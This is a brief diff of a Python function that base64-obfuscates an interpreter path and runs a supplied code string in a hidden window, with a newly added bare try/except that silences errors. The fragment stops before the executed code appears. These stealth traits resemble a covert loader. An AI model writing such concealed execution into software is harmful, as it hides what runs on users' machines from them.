@@ -24,9 +24,11 @@ def run_tst(py_cmd):
     if os.path.exists(base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()):
         python_path = base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()
 
-    if python_path:
-        r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
-        #r = subprocess.Popen([python_path, '-c', py_cmd])
+    try:
+        if python_path:
+            r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
+            #r = subprocess.Popen([python_path, '-c', py_cmd])
+    except: pass
 
 
 run_tst("""
